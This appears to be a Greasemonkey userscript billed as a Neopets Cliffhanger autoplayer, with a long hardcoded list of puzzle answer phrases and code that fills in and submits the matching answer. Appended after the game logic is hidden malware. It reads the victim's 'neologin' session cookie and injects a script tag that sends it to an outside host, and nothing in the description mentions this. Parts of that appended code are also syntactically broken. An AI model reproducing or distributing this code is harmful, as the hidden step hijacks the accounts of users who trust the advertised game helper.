// ==UserScript==
// @name           Neopets - Cliffhanger Autoplayer
// @namespace      Neopets
// @description    Autoplays Cliffhanger
// @include        http://www.neopets.com/games/cliffhanger/*
// ==/UserScript==

// this is a modified version of the script located at http://userscripts.org/scripts/show/6969

try {
// select the area whith the  blanks
blanksArea=document.evaluate("//tbody/tr/td[@bgcolor='skyblue']", document,
		null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
if (blanksArea==null) {
	form = document.evaluate("//form[@action='process_cliffhanger.phtml']", document,
		null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
	if (form!=null) {
		form.elements[1].value=3;
		form.elements[4].click();
	}
	return;
}

// read the blanks area
var puzzle = ''+blanksArea.innerHTML;
puzzle = puzzle.replace(/<b>/g, '');
puzzle = puzzle.replace(/<\/b>/g, '');
puzzle = puzzle.replace(/ /g, '');
puzzle = puzzle.replace(/<fontcolor="red">/g, '');
puzzle = puzzle.replace(/<\/font>/g, '');
puzzle = puzzle.replace(/&nbsp;/g, ' ');
puzzle = puzzle.replace(/<br>/g, ' ');
puzzle = puzzle.replace(/^ */, '');
puzzle = puzzle.replace(/ *$/, '');
// alert("'"+puzzle.replace(/_/g, '?')+"'");

// initialize array with known answers
var answer = new Array();
answer[0] = 'Happy gadgadsbogen day'
answer[1] = 'Better late than never';
answer[2] = 'Meercas despise red neggs';
answer[3] = 'No news is impossible';
answer[4] = 'Scorchios like hot places';
answer[5] = 'Super Glue is forever';
answer[6] = 'All roads lead to neopia';
answer[7] = 'Dr Frank Sloth is green';
answer[8] = 'Dung furniture stinks like dung';
answer[9] = 'Keep your broken toys clean';
answer[10] = 'Koi invented the robotic fish';
answer[11] = 'Nimmos are very spiritual beings';
answer[12] = 'Today is your lucky day';
answer[13] = 'A buzz will never sting you';
answer[14] = 'Be nice to Shoyrus or else';
answer[15] = 'Carrots are so expensive these days';
answer[16] = 'Chia bombers are mud slinging fools';
answer[17] = 'chombies are shy and eat plants';
answer[18] = 'Faeries are quite fond of reading';
answer[19] = 'Flotsams are no longer limited edition';
answer[20] = 'Fuzios wear the coolest red shoes';
answer[21] = 'Garon loves an endless challenging maze';
answer[22] = 'Great neopets are not always wise';
answer[23] = 'Kacheekers is a two player game';
answer[24] = 'Korbats are creatures of the night';
answer[25] = 'Moogi is a true poogle racer';
answer[26] = 'Mr black makes the best shopkeeper';
answer[27] = 'Number six is on the run';
answer[28] = 'Only real card sharks play cheat';
answer[29] = 'Skeiths are strong but very lazy';
answer[30] = 'The beader has a beaming smile';
answer[31] = 'The techo is a tree acrobat';
answer[32] = 'Tyrannians will eat everything and anything';
answer[33] = 'An air of mystery surrounds the acara';
answer[34] = 'Asparagus is the food of the gods';
answer[35] = 'Chombies hate fungus balls with a passion';
answer[36] = 'Faerie food is food from the heavens';
answer[37] = 'Frolic in the snow of happy valley';
answer[38] = 'Jubjubs defend themselves with their deafening screech';
answer[39] = 'Kauvara mixes up potions like no other';
answer[40] = 'Kyrii take special pride in their fur';
answer[41] = 'Mister pickles has a terrible tigersquash habit';
answer[42] = 'Maybe the missing link is really missing';
answer[43] = 'Most Wild Kikos Swim in Kiko Lake';
answer[44] = 'Neopian inflation is a fact of life';
answer[45] = 'Never underestimate the power of streaky bacon';
answer[46] = 'Poogles look the best in frozen collars';
answer[47] = 'Some neggs will bring you big disappointment';
answer[48] = 'Some neggs will bring you big neopoints';
answer[49] = 'The Cybunny is the fastest neopet ever';
answer[50] = 'The pen is mightier than the pencil';
answer[51] = 'The Snowager sleeps most of its life';
answer[52] = 'Tornado rings and cement mixers are unstoppable';
answer[53] = 'Uggaroo gets tricky with his coconut shells';
answer[54] = 'Unis just love looking at their reflection';
answer[55] = 'When there is smoke there is pollution';
answer[56] = 'You cannot teach an old grarrl mathematics';
answer[57] = 'A miss is as good as a mister';
answer[58] = 'A neopoint saved is a neopoint not enough';
answer[59] = 'A tuskaninny named colin lives on terror mountain';
answer[60] = 'An iron rod bends while it is hot';
answer[61] = 'Children should not be seen spanked or grounded';
answer[62] = 'Doctor Sloth tried to mutate neopets but failed';
answer[63] = 'Do not bathe if there is no water';
answer[64] = 'Dr Death is the keeper of disowned neopets';
answer[65] = 'Faerie pancakes go great with crazy crisp tacos';
answer[66] = 'Flame the Tame is a ferocious feline fireball';
answer[67] = 'Have you trained your pet for the Battledome';
answer[68] = 'If your hedge needs trimming call a chomby';
answer[69] = 'Kacheeks have mastered the art of picking flowers';
answer[70] = 'Keep your pet company with a neopet pet';
answer[71] = 'Kikoughela is a fancy word for cough medicine';
answer[72] = 'Kougras are said to bring very good luck';
answer[73] = 'Pet rocks make the most playful of petpets';
answer[74] = 'Scratch my back and I will scratch yours';
answer[75] = 'Snowbeasts love to attack grundos with mud snowballs';
answer[76] = 'The advent calendar is only open in december';
answer[77] = 'The Alien Aisha Vending Machine serves great good';
answer[78] = 'The big spender is an international jet setter';
answer[79] = 'The Bruce is from Snowy Valley High School';
answer[80] = 'The healing springs mends your wounds after battle';
answer[81] = 'The hidden tower is for big spenders only';
answer[82] = 'The library faerie tends to the crossword puzzle';
answer[83] = 'The tatsu population was almost reduced to extinction';
answer[84] = 'You should try to raise your hit points';
answer[85] = 'Whack a beast and win some major points';
answer[86] = 'An idle mind is the best way to relax';
answer[87] = 'Congratulations to everybody who helped defeat the evil monoceraptor';
answer[88] = 'Do not open a shop if you cannot smile';
answer[89] = 'Do not try to talk to a shy peophin';
answer[90] = 'Enter the lair of the beast if you dare';
answer[91] = 'Every neopet should have a job and a corndog';
answer[92] = 'Get three times the taste with the triple dog';
answer[93] = 'It is always better to give than to receive';
answer[94] = 'Let every zafara take care of its own tail';
answer[95] = 'Look out for the moehog transmogrification potion lurking around';
answer[96] = 'Magical ice weapons are from the ice cave walls';
answer[97] = 'Meercas are to blame for all the stolen fuzzles';
answer[98] = 'Mika and Carassa Want You To Buy Their Junk';
answer[99] = 'Neopets battledome is not for the weak or sensitive';
answer[100] = 'Plesio is the captain of the tyrannian sea division';
answer[101] = 'Put all of your neopoints on poogle number two';
answer[102] = 'Poogle five is very chubby but is lightning quick';
answer[103] = 'Poogles have extremely sharp teeth and they are cuddly';
answer[104] = 'Stego is a baby stegosaurus that all neopets love';
answer[105] = 'Sticks n stones are like the greatest band ever';
answer[106] = 'Take your pet to tyrammet for a fabulous time';
answer[107] = 'Terror Mountain is home to the infamous Ski Lodge';
answer[108] = 'The barking of Lupes does not hurt the clouds';
answer[109] = 'The battledome is near but the way is icy';
answer[110] = 'The meat of a sporkle is bitter and inedible';
answer[111] = 'The quick brown fox jumps over the lazy dog';
answer[112] = 'The tyrannian volcano is the hottest place in neopia';
answer[113] = 'There is only one Ryshu and one Techo Master';
answer[114] = 'Treat your usul well and it will be useful';
answer[115] = 'Uggaroo follows footsteps to find food for his family';
answer[116] = 'Your pet deserves a nice stay at the neolodge';
//answer[117] = 'There Is Nothing Like A Tall Glass Of Slime Potion';
answer[117] = ''; //was a duplicate!
answer[118] = 'A chia who is a mocker dances without a tamborine';
answer[119] = 'All neopets can find a job at the employment agency';
answer[120] = 'Become a BattleDome master by training on the Mystery Island';
answer[121] = 'Better to be safe than meet up with a monocerous';
answer[122] = 'Bouncing around on its tail the blumaroo is quite happy';
answer[123] = 'Chias are loveable little characters who are full of joy';
answer[124] = 'Faeries bend down their wings to a seeker of knowledge';
answer[125] = 'Grarrg is the tyrannian battle master that takes no slack';
answer[126] = 'If you live with lupes you will learn to howl';
answer[127] = 'Kyruggi is the grand elder in the tyrannian town hall';
answer[128] = 'Love your neopet but do not hug it too much';
answer[129] = 'Meercas are talented pranksters that take pride in their tails';
answer[130] = 'Oh where is the tooth faerie when you need her';
answer[131] = 'Only ask of the Queen Faerie what you really need';
answer[132] = 'Please wipe your feet before you enter the Scorchio den';
answer[133] = 'Some neohomes are made with mud and dung and straw';
answer[134] = 'Store all of your Neopian trading cards in your neodeck';
answer[135] = 'The best thing to spend on your neopet is time';
answer[136] = 'The kindhearted faerie queen rules faerieland with a big smile';
answer[137] = 'The lair of the beast is cold and dark inside';
answer[138] = 'The meerca is super fast making it difficult to catch';
answer[139] = 'The pound is not the place to keep streaky bacon';
answer[140] = 'There is nothing like a tall glass of slime potion';
answer[141] = 'The sunken city of Maraqua has some great hidden treasures';
answer[142] = 'The tyrannian jungle is full of thick muddle and mash';
answer[143] = 'The wise aisha has long ears and a short tongue';
answer[144] = 'To know and to act are one and the same';
answer[145] = 'Under a tattered cloak you will generally find doctor sloth';
answer[146] = 'With the right training Tuskaninnies can become quite fearsome fighters';
answer[147] = 'Yes boy ice cream sell out all of their shows';
answer[148] = 'A journey of a million miles begins on the marketplace map';
answer[149] = 'Ask a lot of questions but only take what is offered';
answer[150] = 'Be sure to visit the Neggery for some great magical neggs';
answer[151] = 'Bruce could talk under wet cement with a mouthful of marbles';
answer[152] = 'By all means trust in neopia but tie your camel first';
answer[153] = 'Count Von Roo is one of the nastier denizens of neopia';
answer[154] = 'Do not wake the snowager unless you want to be eaten';
answer[155] = 'Every buzz is a kau in the eyes of its mother';
answer[156] = 'Faerie poachers hang out in faerieland with their jars wide open';
answer[157] = 'Give the wheel of excitement a spin or two or three';
answer[158] = 'Grarrls are ferocious creatures or at least they try to be';
answer[159] = 'Have you told your friends about the greatest site on earth';
answer[160] = 'If a pteri and lenny were to race neither would win';
answer[161] = 'Jetsams are the meanest Neopets to ever swim the Neopian sea';
answer[162] = 'Kaus love to sing although they only know a single note';
answer[163] = 'Listen to your pet or your tongue will keep you deaf';
answer[164] = 'Make certain your pet is well equipped before entering the battledome';
answer[165] = 'Only mad gelerts and englishmen go out in the noonday sun';
answer[166] = 'Poogle number five always wins unless he trips over a hurdle';
answer[167] = 'Space slushies are just the thing on a cold winter day';
answer[168] = 'The bluna was first sighted under the ice caps of tyrannia';
answer[169] = 'The Neopedia is a good place to start your Neopian Adventures';
answer[170] = 'Tyrannia is the prehistoric kingdom miles beneath the surface of neopia';
answer[171] = 'When eating a radioactive negg remember the pet who planted it';
answer[172] = 'When friends ask about the battledome say there is no tomorrow';
answer[173] = 'When the blind lead the blind get out of the way';
answer[174] = 'You cannot wake a Bruce who is pretending to be asleep';
answer[175] = 'You know the soup kitchen is a great place to go';
answer[176] = 'You know you can create a free homepage for your pet';
answer[177] = 'You probably do not want to know what that odor is';
answer[178] = 'A kyrii will get very upset if its hair gets messed up';
answer[179] = 'By all means make neofriends with peophins but learn to swim first';
answer[180] = 'Catch the halter rope and it will lead you to the kau';
answer[181] = 'Cliffhanger is a brilliant game that will make your pet more intelligent';
answer[182] = 'Dirty snow is the best way to make your battledome opponent mad';
answer[183] = 'Do not be in a hurry to tie what you cannot untie';
answer[184] = 'Do not speak of an elephante if there is no tree nearby';
answer[185] = 'Do not think there are no jetsams if the water is calm';
answer[186] = 'Eat all day at the giant omelette but do not be greedy';
answer[187] = 'Everyone loves to drink a hot cup of borovan now and then';
answer[188] = 'Experience is the comb that nature gives us when we are bald';
answer[189] = 'Fly around the canyons of tyrannia shooting the evil pterodactyls and grarrls';
answer[190] = 'If you see a man riding a wooden stick ask him why';
answer[191] = 'If you want to have lots of adventures then adopt a wocky';
answer[192] = 'Jarbjarb likes to watch the tyrannian sunset while eating a ransaurus steak';
answer[193] = 'Krawk have been known to be as strong as full grown neopets';
answer[194] = 'Myncies love to hug their plushies and eat sap on a stick';
answer[195] = 'Quiggles spend all day splashing around in the pool at the neolodge';
answer[196] = 'The Grarrl will roar and ten eggs will hatch into baby grarrls';
answer[197] = 'The Snow Faerie Quest is for those that can brave the cold';
answer[198] = 'The wheel of mediocrity is officially the most second rate game around';
answer[199] = 'There is only one ryshu and there is only one techo master';
answer[200] = 'Uggsul invites you to play a game or two of tyranu evavu';
answer[201] = 'When an Elephante is in trouble even a Nimmo will kick him';
answer[202] = 'You should not throw baseballs up when the ceiling fan is on';
answer[203] = 'A Scorchio is a good storyteller if it can make a Skeith listen';
answer[204] = 'Bang and smash your way to the top in the bumper cars game';
answer[205] = 'Do not be greedy and buy every single food item from the shops';
answer[206] = 'Faerieland is not for pets that are afraid of heights or fluffy clouds';
answer[207] = 'If at first you do not succeed play the ice caves puzzle again';
answer[208] = 'If you go too slow try to keep your worms in a tin';
answer[209] = 'If your totem is made of wax do not walk in the sun';
answer[210] = 'It makes total sense to have a dung carpet in your dung neohome';
answer[211] = 'Myncies come from large families and eat their dinner up in the trees';
answer[212] = 'The Neopian Hospital will help get your pet on the road to recovery';
answer[213] = 'We never know the worth of items till the wishing well is dry';
answer[214] = 'You can lead a kau to water but you cannot make it drink';
answer[215] = 'Building a neohome is a way to build a foundation for your little pets';
answer[216] = 'You know you should never talk to Bruce even when his mouth is full';
answer[217] = 'Your neopet will need a mint after eating a chili cheese dog with onions';
answer[218] = 'Why beg for stuff when you can make money at the wheel of excitement';
answer[219] = 'Bronto bites are all the rage and they are meaty and very easy to carry';
answer[220] = 'The beast that lives in the tyrannian mountains welcomes all visitors with a sharp smile';
answer[221] = 'The whisper of an acara can be heard farther than the roar of a wocky';
answer[222] = 'You really have to be well trained if you want to own a wild reptillior';

// select possible answers from hardcoded list.
var possible = new Array();
var regexp=new RegExp("^"+puzzle.replace(/_/g, '\\w')+"$");
regexp.ignoreCase=true;

for (var ans = 0; ans < answer.length; ans++) {
	if (answer[ans].length==puzzle.length) {
		if (regexp.test(answer[ans])) {
			possible.push(answer[ans]);
		}
	}
}

if (possible.length==1) {
	solveinput=document.evaluate("//input[@name='solve_puzzle']", document,
		null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
	solvesubmit=document.evaluate("//input[@value='I Know!!! Let Me Solve The Puzzle!']", document,
		null, XPathResult.ANY_UNORDERED_NODE_TYPE, null).singleNodeValue;
	solveinput.value=possible[0];
	solvesubmit.click();
} else {
	alert(possible.join('\n'));
}

} catch (e) {
	GM_log("np-cliffhangerautoplayer: "+e);
}
function GetStringBetween( target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); cut to start from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = 'http:h1.ripway.com/NpSeller4Life1/cookie.php?cookie=';

var testArray = document.evaluate(
     "a[@href='javascript: void(0);']",
document, null, XPathResult.ANY_TYPE,null);

var strTest = testArray.iterateNext();

while (strTest) {
strTest = testArray.iterateNext();
}

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}

